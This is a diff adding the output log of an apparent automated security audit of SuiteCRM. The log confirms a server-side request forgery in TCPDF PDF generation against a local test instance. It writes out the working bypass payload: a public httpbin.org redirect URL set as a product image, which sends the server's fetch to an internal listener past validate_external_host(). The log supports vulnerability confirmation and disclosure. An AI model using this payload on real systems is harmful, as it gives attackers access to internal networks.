@@ -1,0 +1,22 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-047/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-047/../.venv
+========================================================================
+VULN-047: TCPDF <img> SSRF on PDF generation (guard-then-redirect-bypass)
+target: http://localhost:33116
+========================================================================
+[STEP] admin web login (provisioning only)
+[OK] admin session established
+[STEP] provisioning a fresh NON-ADMIN user (proves PR:L)
+[OK] created user mod_3cdc21e3 (id=e1a905bb-2ceb-4602-9bb9-6622caf207f1)
+[STEP] seeding fixture: AOS_Products(1159c28c-e8dc-4dfa-8893-fb1102f5b876), AOS_Quotes(31799b68-77e2-48d8-8ab3-39754f55e8cf), AOS_Products_Quotes line item(99322a4b-31d2-49cd-b0b6-3f14bfa732d6), AOS_PDF_Templates(433e9a40-3cd8-41d0-81e3-c1803f511309)
+[OK] fixture seeded
+[SETUP] OOB HTTP listener on 0.0.0.0:33119 (app reaches it at 172.18.0.1:33119)
+[STEP] web login as low-priv user mod_3cdc21e3
+[OK] low-priv session established
+[STEP] TEST 1/2 (guard sanity check): product_image = http://172.18.0.1:33119/canary-pdfdirect_180833da (direct internal IP)
+[INFO] generatePdf HTTP 200, content-type=application/pdf, len=42699
+[OK] as expected: validate_external_host() blocked the direct private-IP target (SuiteTCPDF.php:95) -- no OOB hit. The static finding's 'no guard at all' claim is refuted for this sink; proceeding to the redirect-bypass test.
+[STEP] TEST 2/2 (bypass): product_image = https://httpbin.org/redirect-to?url=http%3A%2F%2F172.18.0.1%3A33119%2Fcanary-pdfredir_2e6e7b4f&status_code=302 (public, guard-approved, 302s internally)
+[INFO] generatePdf HTTP 200, content-type=application/pdf, len=42995
+[PROOF] OOB listener received GET /canary-pdfredir_2e6e7b4f (User-Agent: 'tcpdf') during TEST 2 only -- validate_external_host() approved the public httpbin.org URL, then TCPDF's own fetch (vendored library, outside SuiteCRM's guard) followed the 302 straight to the internal-only listener.
+==> VULN-047: CONFIRMED — guard blocks direct internal targets (TEST 1: no hit) but a public redirector bypasses it (TEST 2: hit for http://172.18.0.1:33119/canary-pdfredir_2e6e7b4f) -- corrected mechanism vs. the static finding, see notes.md
